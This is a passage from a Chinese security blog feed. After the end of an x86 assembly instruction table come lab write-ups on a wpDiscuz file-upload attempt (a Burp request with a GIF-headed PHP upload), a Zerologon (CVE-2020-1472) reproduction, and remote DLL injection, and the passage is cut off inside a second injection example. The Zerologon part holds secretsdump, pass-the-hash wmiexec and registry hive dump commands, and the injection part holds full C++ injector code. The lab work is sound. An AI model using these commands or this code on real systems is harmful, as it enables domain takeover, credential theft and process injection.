data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>call</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>将当前的IP 或者 CS:IP 压入栈中，跳转到指定位置</div><div><br></div><div>简单描述：</div><div>sp = sp -2</div><div>ss 10(16进制) + sp = ip （将IP的值压栈）</div><div>IP = IP +16位位移&nbsp;&nbsp;（就是jmp了）</div><div><img src="汇编指令_files/Image [5].png" type="image/png" data-filename="Image.png"></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp; MOV AX,264CH</div><div>&nbsp; CALL FAN</div><div>&nbsp; &nbsp;MOV BX,142CH</div><div>FAN: MOV AH,4CH</div><div>&nbsp; &nbsp;INT 21H</div><div><br></div><div>搭配RET一起使用：</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,264CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CALL FAN</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MOV BX,248CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JMP T</div><div>&nbsp;&nbsp;&nbsp;&nbsp;;此处输入代码段代码</div><div>FAN: MOV AH,4CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,0006H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;RET ;跳回到MOV BX执行</div><div>T:&nbsp;&nbsp;INT 21H</div><div><img src="汇编指令_files/save.png" type="image/png" data-filename="save.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>movsx</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>符号扩展的意思是,当计算机存储某一个有符号数时,符号位位于该数的第一位,所以，当扩展一个负数的时候需要将扩展的高位全赋为1.对于正数而言，符号扩展和零扩展MOVZX是一样的，将扩展的高位全赋为0</div><div>(X86汇编或以上才有)</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp;&nbsp;例子:MOV BL,80H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MOVSX AX,BL</div><div>&nbsp;&nbsp;&nbsp;AX == 0FF80H</div><div>&nbsp;&nbsp;&nbsp;可能初学者奇怪80H不是正数吗?FF怎么来的?看下面，</div><div>&nbsp;&nbsp;&nbsp;80h = 1000 0000 最高位为符号位, 即符号位为1</div><div>&nbsp;&nbsp;&nbsp;则MOVSX AX, BL后, AX = 1111 1111 1000 0000 = FF80h</div><div><img src="汇编指令_files/Image [6].png" type="image/png" data-filename="Image.png"></div><div><br></div><div><img src="汇编指令_files/Image [7].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>movzx</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>movzx是把高位全部用0填充，被进行赋值操作的寄存器会把得到的值放在地位寄存器，然后高位寄存器全0补充</div><div><br></div><div>(X86汇编或以上才有)</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov BX, 12C5H</div><div>movzx EAX,BX</div><div><br></div><div><img src="汇编指令_files/Image [8].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>pusha</div><div>pushad</div><div>popa</div><div>popad</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>pusha/pushad两条指令都是将通用寄存器进行入栈</div><div>popa/popad两条指令都是将栈段内的数据全部出栈到通用寄存器</div><div>参考链接：<a href="https://blog.csdn.net/u013490896/article/details/50866801?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/u013490896/article/details/50866801?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div><img src="汇编指令_files/Image [9].png" type="image/png" data-filename="Image.png"></div><div><img src="汇编指令_files/Image [10].png" type="image/png" data-filename="Image.png"></div><div><img src="汇编指令_files/Image [11].png" type="image/png" data-filename="Image.png"><img src="汇编指令_files/Image [12].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>bswap</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>寄存器高位和地位数据字节次序变反</div><div>Example：</div><div>EAX=12345678H</div><div>变反后：</div><div>78563412H</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div><img src="汇编指令_files/Image [13].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>lea</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>（x86汇编或以上才有） load effective address, 加载有效地址，可以将有效地址传送到指定的的寄存器。指令形式是从存储器读数据到寄存器, 效果是将存储器的有效地址写入到目的操作数, 简单说, 就是C语言中的”&amp;”.（把DS:[寄存器]地址所指向的值基于给某给寄存器）</div><div><br></div><div>lea对变量没有影响是取地址,对寄存器来说加[]时取值,第二操作数不加[]非法</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov eax,0x4C2</div><div>lea ebx,dword ptr DS:[EAX] ;将EAX的地址给ebx</div><div><img src="汇编指令_files/Image [14].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>LODSD</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>LODSB、LODSW 和 LODSD 指令分别从 ESI 指向的内存地址加载一个字节或一个字到 AL/AX/EAX。ESI 按照方向标志位的状态递增或递减。</div><div><br></div><div>LODS 很少与 REP 前缀一起使用，原因是，加载到累加器的新值会覆盖其原来的内容。相对而言，LODS常常被用于加载单个 数值。在后面的例子中，LODSB代替了如下两条指令（假设方向标志位清零）：</div><div>mov al, ［esi］&nbsp;&nbsp;&nbsp; ;将字节送入AL</div><div>inc esi&nbsp;&nbsp;&nbsp; ;指向下一个字节</div><div><br></div><div>默认将DS:[esi]地址所指向的值赋予EAX</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div><img src="汇编指令_files/Image [15].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>xchg</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>两个寄存器的值互相交换</div><div>xchg &lt;被交换的寄存器&gt;,&lt;要交换的寄存器&gt;</div><div>例如：xchg eax,esi</div><div>EAX=ESI的值</div><div>ESI=EAX的值</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>执行前：</div><div><img src="汇编指令_files/Image [16].png" type="image/png" data-filename="Image.png"></div><div><br></div><div>执行xchg指令后：</div><div><img src="汇编指令_files/Image [17].png" type="image/png" data-filename="Image.png"></div><div><br></div><div><br></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>test</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>对两个寄存器进行逻辑计算，根据返回的结果修改标志位,自己测试的时候是如果寄存器其中一方为0，Z、P标准位设置位1，否则Z、P标准位设置为0。下面是文章说的</div><div><br></div><div>( 影响标志: C,O,P,Z,S(其中C与O两个标志会被设为0))</div><div><br></div><div>该指令主要用来判断其中一方的寄存器是否为0</div><div><br></div><div>顺便说一下标志位，所有标志位在念的时候都加一个F，比如：Z=ZF标准位，C=CF标志位</div><div><br></div><div><br></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>其中一方寄存器为0</div><div><img src="汇编指令_files/20200809171409.png" type="image/png" data-filename="20200809171409.png" width="348"></div><div><br></div><div>两边的寄存器都不为0</div><div><img src="汇编指令_files/20200809171045.png" type="image/png" data-filename="20200809171045.png"></div></td></tr></tbody></table><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>内存读写的大小端<br>主流的汇编架构，内存里都是小端<br>例如：mov ax,4C3B -&gt; 内存里：3B4C<br><img src="https://s1.ax1x.com/2020/09/21/wqd9gO.png" alt=""></p><p>大端：mov ax,4C3B -&gt; 内存里：4C3B</p><p>大端只有在很少见的IOT设备可能有</p>]]></content>
      
      
        <tags>
            
            <tag> 底层 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记一次失败的代码审计复现</title>
      <link href="/posts/8a502742.html"/>
      <url>/posts/8a502742.html</url>
      <content type="html"><![CDATA[<p>原本想着复现wpDiscuz插件任意文件上传的。后面没成功<br>跟了一下代码不清楚是不是修复了，做个笔记</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>phpstudy<br>php 7.0.2<br>wpdiscuz.7.0.3</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/8276" target="_blank" rel="noopener">https://xz.aliyun.com/t/8276</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>将给出的下载插件链接：<a href="https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip" target="_blank" rel="noopener">https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip</a><br>下载完后解压到<code>wp-content/plugins</code><br><img src="https://s1.ax1x.com/2020/09/20/wT9tzt.png" alt=""></p><p>然后登录wordpress启用插件<br><img src="https://s1.ax1x.com/2020/09/20/wT9asf.png" alt=""></p><p>之后在文章评论区看到如下<br><img src="https://s1.ax1x.com/2020/09/20/wTCs0O.png" alt=""></p><p>根据文章所述，gif头的php进行文件上传，burp抓一波包可以看到如下<br>(上传失败)<br><img src="https://s1.ax1x.com/2020/09/20/wTCgtH.png" alt=""></p><p>先看看请求包，然后去分析代码</p><pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1Host: 192.168.1.109Content-Length: 653Accept: */*DNT: 1X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLjgZd9hliOFxBBcgOrigin: http://192.168.1.109Referer: http://192.168.1.109/?p=1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: wordpress_test_cookie=WP+Cookie+check; comment_author_email_145d7bef132f82360a6cd87256e47c05=admin@qq.com; comment_author_145d7bef132f82360a6cd87256e47c05=adminConnection: close------WebKitFormBoundaryLjgZd9hliOFxBBcgContent-Disposition: form-data; name=&quot;action&quot;wmuUploadFiles------WebKitFormBoundaryLjgZd9hliOFxBBcgContent-Disposition: form-data; name=&quot;wmu_nonce&quot;09f13eeda3------WebKitFormBoundaryLjgZd9hliOFxBBcgContent-Disposition: form-data; name=&quot;wmuAttachmentsData&quot;undefined------WebKitFormBoundaryLjgZd9hliOFxBBcgContent-Disposition: form-data; name=&quot;wmu_files[0]&quot;; filename=&quot;test.php&quot;Content-Type: application/octet-streamGIF89a&lt;?php phpinfo();a?&gt;------WebKitFormBoundaryLjgZd9hliOFxBBcgContent-Disposition: form-data; name=&quot;postId&quot;1------WebKitFormBoundaryLjgZd9hliOFxBBcg--</code></pre><p>这里的action是对应模块的处理函数的key<code>wmuUploadFiles</code><br>admin-ajax.php<br><img src="https://s1.ax1x.com/2020/09/20/wTChct.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/09/20/wTCoB8.png" alt=""></p><p>直接搜索<code>wmuUploadFiles</code>即可找到处理函数所在的位置<br>(这里其实你也可以单步，跟到他调用函数部分,但是实在太乱。过程变量太多<br>类似于wordpress也可以看看，请求的页面接收的参数到哪里处理的。直接搜索那个参数可以快速找到功能处理所在的php)<br><img src="https://s1.ax1x.com/2020/09/20/wTP38A.png" alt=""></p><p>路径在<code>wordpress\wp-content\plugins\wpdiscuz\utils\class.WpdiscuzHelperUpload.php</code><br><img src="https://s1.ax1x.com/2020/09/20/wTPYKP.png" alt=""></p><p>找到处理函数<br>！<a href="https://s1.ax1x.com/2020/09/20/wTiqln.png" target="_blank" rel="noopener"></a></p><p>debug一顿后到312行开始有file请求的处理<br><img src="https://s1.ax1x.com/2020/09/20/wTFZTO.png" alt=""></p><p>关键点在<code>getMimeType</code>和<code>isAllowedFileType</code><br>getMimeType函数</p><pre><code class="php"> private function getMimeType($file, $extension) {        $mimeType = &quot;&quot;;        if (function_exists(&quot;mime_content_type&quot;)) { //判断mime_content_type函数是否存在，存在就用这个函数处理否则用别的函数或者自己处理            $mimeType = mime_content_type($file[&quot;tmp_name&quot;]); // 获取文件MIME 类型        } elseif (function_exists(&quot;finfo_open&quot;) &amp;&amp; function_exists(&quot;finfo_file&quot;)) {            $finfo = finfo_open(FILEINFO_MIME_TYPE);            $mimeType = finfo_file($finfo, $file[&quot;tmp_name&quot;]);        } elseif ($extension) {            $matches = wp_check_filetype($file[&quot;name&quot;], $this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;]);            $mimeType = empty($matches[&quot;type&quot;]) ? &quot;&quot; : $matches[&quot;type&quot;];        }        return $mimeType;    }</code></pre><p>mime_content_type他这个函数一直没有，我以为是版本问题换了之后还是一样。还是到wp_check_filetype函数处理<br><img src="https://s1.ax1x.com/2020/09/20/wTFNtg.png" alt=""></p><p>wp_check_filetype函数<br>根据正则返回对应的MIME类型和文件后缀</p><pre><code class="php">function wp_check_filetype( $filename, $mimes = null ) { //test.gif    if ( empty( $mimes ) ) {        $mimes = get_allowed_mime_types(); //返回对应后缀和对应的MIME类型    }    $type = false;    $ext  = false;    foreach ( $mimes as $ext_preg =&gt; $mime_match ) {        $ext_preg = &#39;!\.(&#39; . $ext_preg . &#39;)$!i&#39;;        if ( preg_match( $ext_preg, $filename, $ext_matches ) ) { //正则匹配后缀文件名            $type = $mime_match; //对应的MIME类型            $ext  = $ext_matches[1]; //返回文件名            break;        }    }    return compact( &#39;ext&#39;, &#39;type&#39; );}</code></pre><p><img src="https://s1.ax1x.com/2020/09/20/wTF0cn.png" alt=""></p><p>上传php的时候$mimeType类型最后为空(自己测的时候)<br><img src="https://s1.ax1x.com/2020/09/20/wTkI2j.png" alt=""></p><p>然后到文件头部判断<code>getMimeTypeFromContent</code></p><pre><code class="php">    public function getMimeTypeFromContent($path) {        $fileContent = $path &amp;&amp; function_exists(&quot;file_get_contents&quot;) &amp;&amp; ($v = file_get_contents($path)) ? $v : &quot;&quot;; //读取文件内容        if ($fileContent &amp;&amp; preg_match(&#39;/\A(?:(\xff\xd8\xff)|(GIF8[79]a)|(\x89PNG\x0d\x0a)|(BM)|(\x49\x49(?:\x2a\x00|\x00\x4a))|(FORM.{4}ILBM))/&#39;, $fileContent, $hits)) { //文件头信息获取            $type = [                1 =&gt; &quot;jpeg&quot;,                2 =&gt; &quot;gif&quot;,                3 =&gt; &quot;png&quot;,                4 =&gt; &quot;bmp&quot;,                5 =&gt; &quot;tiff&quot;,                6 =&gt; &quot;ilbm&quot;,            ];            return $type[count($hits) - 1]; //$hits统计出的数量减1，然后在到$type取对应的后缀        }        return false;    }</code></pre><p>测试的payload为<code>GIF98a&lt;?php phpinfo();?&gt;</code>这里获取到的是gif<br><img src="https://s1.ax1x.com/2020/09/20/wTAtzj.png" alt=""></p><p>然后又进到<code>wp_check_filetype</code>函数…判断后缀<br>(返回false)<br><img src="https://s1.ax1x.com/2020/09/20/wTAgSJ.png" alt=""></p><p>然后到了</p><pre><code class="php"> $mimeType = empty($matches[&quot;type&quot;]) ? &quot;&quot; : $matches[&quot;type&quot;];</code></pre><p>由于返回false这里就返回空<br><img src="https://s1.ax1x.com/2020/09/20/wTEEmq.png" alt=""></p><p>然后到<code>isAllowedFileType</code>函数判断<br><img src="https://s1.ax1x.com/2020/09/20/wTE4js.md.png" alt=""></p><pre><code class="php">   private function isAllowedFileType($mimeType) {        $isAllowed = false;        if (!empty($this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;]) &amp;&amp; is_array($this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;])) {            $isAllowed = in_array($mimeType, $this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;]);        }        return $isAllowed;    }</code></pre><p>判断类型是否在数组里面<br><img src="https://s1.ax1x.com/2020/09/20/wTVpHx.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/09/20/wTVi4O.png" alt=""></p><p><code>$isAllowed</code>返回False，然后<code>$error</code>为True，返回错误<br><img src="https://s1.ax1x.com/2020/09/20/wTVQ58.png" alt=""></p><p>报错为类型(MIME)错误</p><p>（就在快发布的时候乱想，然后成了。就tm离谱）（但是不使用GIF89a头，因为加上那个头部的话又到getMimeTypeFromContent函数里面了，后缀正则匹配不到<br>给返回个False）<br>但是如果<code>getMimeType</code>这里用的是mime_content_type的话确实是可以进行文件上传<br>为了验证，手动将isAllowedFileType返回修改为true<br><img src="https://s1.ax1x.com/2020/09/20/wTm38O.png" alt=""></p><p>然后到348行进行文件处理上传<br><img src="https://s1.ax1x.com/2020/09/20/wTKpbd.png" alt=""></p><p><code>uploadSingleFile</code>函数</p><pre><code class="php">private function uploadSingleFile($file) {        $currentTime = WpdiscuzHelper::getMicrotime(); //获取时间戳        $attachmentData = [];        $path = $this-&gt;wpUploadsPath . &quot;/&quot;; //当前年月日的文件夹        $fName = $file[&quot;name&quot;]; //文件名        $pathInfo = pathinfo($fName); //分割路径        $realFileName = $pathInfo[&quot;filename&quot;];        $ext = empty($pathInfo[&quot;extension&quot;]) ? &quot;&quot; : strtolower($pathInfo[&quot;extension&quot;]);        $sanitizedName = sanitize_file_name($realFileName);        $cleanFileName = $sanitizedName . &quot;-&quot; . $currentTime . &quot;.&quot; . $ext; //时间戳后缀拼接        $cleanRealFileName = $sanitizedName . &quot;.&quot; . $ext;        $fileName = $path . $cleanFileName; //路径拼接        if (in_array($ext, [&quot;jpeg&quot;, &quot;jpg&quot;])) { //没进去            $this-&gt;imageFixOrientation($file[&quot;tmp_name&quot;]);        }        $success = apply_filters(&quot;wpdiscuz_mu_compress_image&quot;, false, $file[&quot;tmp_name&quot;], $fileName, $q = 60);        if ($success || @move_uploaded_file($file[&quot;tmp_name&quot;], $fileName)) { //文件移动            $postParent = apply_filters(&quot;wpdiscuz_mu_attachment_parent&quot;, 0);            $attachment = [                &quot;guid&quot; =&gt; $this-&gt;wpUploadsUrl . &quot;/&quot; . $cleanFileName,                &quot;post_mime_type&quot; =&gt; $file[&quot;type&quot;],                &quot;post_title&quot; =&gt; preg_replace(&quot;#\.[^.]+$#&quot;, &quot;&quot;, wp_slash($fName)),                &quot;post_excerpt&quot; =&gt; wp_slash($fName),                &quot;post_content&quot; =&gt; &quot;&quot;,                &quot;post_status&quot; =&gt; &quot;inherit&quot;,                &quot;post_parent&quot; =&gt; $postParent            ];            if ($attachId = wp_insert_attachment($attachment, $fileName)) {                add_filter(&quot;intermediate_image_sizes&quot;, [&amp;$this, &quot;getImagesSizes&quot;]);                $attachData = wp_generate_attachment_metadata($attachId, $fileName);                wp_update_attachment_metadata($attachId, $attachData);                update_post_meta($attachId, &quot;_wp_attachment_image_alt&quot;, $fName);                $ip = WpdiscuzHelper::getRealIPAddr();                update_post_meta($attachId, self::METAKEY_ATTCHMENT_OWNER_IP, $ip);                update_post_meta($attachId, self::METAKEY_ATTCHMENT_COMMENT_ID, 0);                $attachmentData[&quot;id&quot;] = $attachId;                $attachmentData[&quot;url&quot;] = empty($attachData[&quot;sizes&quot;][&quot;thumbnail&quot;][&quot;file&quot;]) ? $this-&gt;wpUploadsUrl . &quot;/&quot; . $cleanFileName : $this-&gt;wpUploadsUrl . &quot;/&quot; . $attachData[&quot;sizes&quot;][&quot;thumbnail&quot;][&quot;file&quot;];                $attachmentData[&quot;fullname&quot;] = $cleanRealFileName;                $attachmentData[&quot;shortname&quot;] = $this-&gt;getFileName($cleanRealFileName);            }        }        return $attachmentData;    }</code></pre><p><img src="https://s1.ax1x.com/2020/09/20/wTM7fx.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2020-1472复现</title>
      <link href="/posts/b2a3f021.html"/>
      <url>/posts/b2a3f021.html</url>
      <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p>当攻击者使用Netlogon远程协议（MS-NRPC）建立与域控制器的易受攻击的Netlogon安全通道连接时，将存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络上的设备上运行特制的应用程序。<br>要利用此漏洞，将需要未经身份验证的攻击者使用MS-NRPC连接到域控制器以获得域管理员访问权限。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows Server 2008 R2（用于基于x64的系统）Service Pack 1<br>Windows Server 2008 R2（用于基于x64的系统）Service Pack 1（服务器核心安装）<br>Windows Server 2012<br>Windows Server 2012（服务器核心安装）<br>Windows Server 2016<br>Windows Server 2016（服务器核心安装）<br>Windows Server 2019<br>Windows Server 2019（服务器核心安装）<br>Windows Server 1903版（服务器核心安装）<br>Windows Server版本1909（服务器核心安装）<br>Windows Server 2004版（服务器核心安装）</p><p>缓解措施：暂无</p><h2 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h2><p>测试环境：windows server 2008和windows server 2012<br>测试结果:Windows server 2012失败（作者的windows server 2012 sp2可以成功）</p><p>dcip:192.168.1.111(由于某些原因我改了一下ip后面到了192.168.1.107)<br>domain:demo.com</p><p>使用给出的exp地址:<a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472</a></p><pre><code>python zerologon_tester.py &lt;dcname&gt; &lt;dcip&gt;python zerologon_tester.py testing 192.168.1.111</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcnquF.png" alt=""></p><p>使用scretsdump.py指定空hash或者-no-pass进行dcsync dump (我这里的no-pass并没有成功，不知道是不是这个exp的问题还是什么原因)</p><pre><code>python secretsdump.py demo.com/&#39;TESTING -hashes aad3b435b51404eeaad3b435b51404ee:d42e7df83d64ed8c8e5630ce63cdeee0@192.168.1.107 -hashes aad3b435b51404eeaad3b435b51404ee:d42e7df83d64ed8c8e5630ce63cdeee0</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcuugf.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/09/16/wcnx41.png" alt=""></p><p>然后使用wmicexec连接到dc</p><pre><code>wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f7fc88c760df9ce3d74657a5943e42e demo.com/administrator@192.168.1.107</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcu9gK.png" alt=""></p><p>保存sam文件下载到本地</p><pre><code>reg save hklm\sam c:\sam.hivereg save hklm\system c:\system.hivereg save hklm\security c:\security.hive</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcuiuD.md.png" alt=""></p><p>secretsdump解析sam（这里的MACHINE.ACC的hash是原来机器账户的hash）</p><pre><code>python3 secretsdump.py -system system.hive -system system.hive -security security.hive LOCAL</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcuZ4I.png" alt=""></p><p>然后使用poc给出的restorepassword.py恢复hash（这里需要新版impacket我这里没有成，借一下文章的图）</p><pre><code>python3 reinstall_original_pw.py testing 192.168.1.107 52bc2ea24e84d8faf163364510dd3b07b36c9c85a5846614328ccd3ff83e5ff825e3e0ae11759f1393ba10b572a480ee78272a341a2abb8b4ef65f1b754045d577543d70eac45b471d688e91dc4306a5bf0021d4d0dedaabdc866aeb260232fe85bc2319a47665e6a7cf10751e16a064ef79486d6fc86abeac64d86f5c91d8b5ba787194c082c16da99bbeca73ab323de5cc8a86ddd25d8f5e842c4ab8d4f8b304d920e9d2b3ffe43ff955173eb2451c915b712115d791560eb532cc4b30d093497a96b2941d2fbc8bc9a00fafb0a1b9b6bf466171937ee1f5e8c93fd17392ac897491b708ee934583c89d65ef6a97d1</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wculDg.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/09/16/wcu8Ej.png" alt=""></p><p>参考链接:<br><a href="https://mp.weixin.qq.com/s?__biz=MzI2ODQwNTkxNw==&amp;mid=2247483702&amp;idx=1&amp;sn=263cb1377e79f3d6e11b57b96f5e3755" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2ODQwNTkxNw==&amp;mid=2247483702&amp;idx=1&amp;sn=263cb1377e79f3d6e11b57b96f5e3755</a></p><p>exp我上传了仓库<br><a href="https://github.com/422926799/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/422926799/CVE-2020-1472</a></p>]]></content>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>远程DLL注入研究</title>
      <link href="/posts/7c405794.html"/>
      <url>/posts/7c405794.html</url>
      <content type="html"><![CDATA[<p>太久没更新，都忘了写了。最近研究了一下远程DLL注入<br>做个笔记</p><h2 id="CreateRemoteThread远程线程调用"><a href="#CreateRemoteThread远程线程调用" class="headerlink" title="CreateRemoteThread远程线程调用"></a>CreateRemoteThread远程线程调用</h2><p>原理:</p><pre><code>* 读取目标要注入dll的进程句柄* 计算存储DLL路径所需要的字节数* 为远程进程分配一个内存以存储DLL路径名称* 复制DLL路径到远程进程* 获取LoadLibraryW在Kernel32.dll中的地址* 创建远程调用LoadLibraryW(在远程地址空间中)加载DLL* 等待远程线程结束(卸载DLL)</code></pre><pre><code class="cpp">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;int main(int argc,char *argv[]){        DWORD dwDesiredAccess= PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD |  PROCESS_VM_OPERATION | PROCESS_VM_WRITE;        BOOL bInheritHandle=0;        DWORD dwProcessId;        PCWSTR dllPath = TEXT(&quot;C:\\testdll.dll&quot;); //设置DLLL路径        int dlllen = lstrlen(dllPath);        int dllbytes = dlllen * 2; //计算dll路径长度        if (argc == 2) {               dwProcessId = atoi(argv[1]);        }        else {               printf(&quot;Example:test.exe &lt;process_id&gt;\n&quot;);               exit(1);        }        HANDLE process=OpenProcess(dwDesiredAccess,bInheritHandle,dwProcessId); //读取进程获取句柄        if (process==0){               printf(&quot;[-] OpenProcess failure,Error code:%d\n&quot;,GetLastError());               exit(1);        }        else {               printf(&quot;[*] OpenProcess Sucess\n&quot;);        }        LPVOID vallex = VirtualAllocEx(process, 0, dllbytes, MEM_COMMIT, PAGE_READWRITE); //给远程地址分配一个可以放下dll路径的内存空间        if (vallex == 0) {               printf(&quot;[-] VirtualAllocEx failure,Error Code:%d\n&quot;,GetLastError());               exit(1);        }        else {               printf(&quot;[*] VirtualAllocEx Sucess\n&quot;);        }        if (!WriteProcessMemory(process, vallex, dllPath, dllbytes, 0)) { //远程内存写入               printf(&quot;[-] WriteProcessMemory failure,Error Code:%d\n&quot;, GetLastError());               exit(1);        }        else {               printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);        }        FARPROC moduleaddress = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)),  &quot;LoadLibraryW&quot;); //获取Kernel32.dll里面LoadLibraryW函数地址        if (moduleaddress == 0) {               printf(&quot;[-] GetProcAddress failure,Error Code:%d\n&quot;, GetLastError());               exit(1);        }        else {               printf(&quot;[*] GetProcAddress Sucess\n&quot;);        }        HANDLE createthread_ = CreateRemoteThread(process, 0, 0,  LPTHREAD_START_ROUTINE(moduleaddress), vallex, 0, 0); //在远程进程调用dll        if (createthread_ == 0) {               printf(&quot;[-] createthread failure,Error Code:%d\n&quot;, GetLastError());               exit(1);        }        else {               printf(&quot;[*] CreateRemoteThread Sucess\n&quot;);               WaitForSingleObject(createthread_, INFINITE); //等待线程创建结束（卸载DLL）        }        return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/09/14/wBJ526.png" alt=""></p><p>注入测试<br><img src="https://s1.ax1x.com/2020/09/14/wBJ7rD.png" alt=""></p><h2 id="RtlCreateUserThread-DLL远程注入"><a href="#RtlCreateUserThread-DLL远程注入" class="headerlink" title="RtlCreateUserThread DLL远程注入"></a>RtlCreateUserThread DLL远程注入</h2><blockquote><p> RtlCreateUserThread是CreateRemoteThread的底层实现，所以使用RtlCreateUserThread的原理是和使用CreateRemoteThread的原理是一样的，这个函数可以实现跨会话创建线程。唯一的问题就是：当我们在Vista 之前的操作系统调用此函数所创建的线程并没有通知给csrss 进程，它没有完整的初始化，在调用一些网络或者其它的系统函数的时候他可能返回失败，而通过CreateRemoteThread 创建的线程没有任何问题，在Vista+的操作系统上调用此函数也没有问题。因此我们需要判断系统版本，当目标系统为Vista-的时候，我们应该通过RtlCreateUserThread创建一个挂起的线程，然后调用CsrClientCallServer通知csrss 这个线程的创建，然后csrss 做相应的记录及初始化工作之后，我们再恢复线程的执行。最后，我们新创建的线程必须自己调用ExitThread退出，否则也会产生崩溃的情况。</p></blockquote><p>原理:</p><pre><code>* 读取目标要注入dll的进程句柄* 计算存储DLL路径所需要的字节数* 为远程进程分配一个内存以存储DLL路径名称* 复制DLL路径到远程进程* 获取LoadLibraryW在Kernel32.dll中的地址* 创建远程调用LoadLibraryW(在远程地址空间中)加载DLL* 在卸载的时候会此DLL</code></pre><pre><code class="cpp">#include &quot;stdafx.h&quot;#include 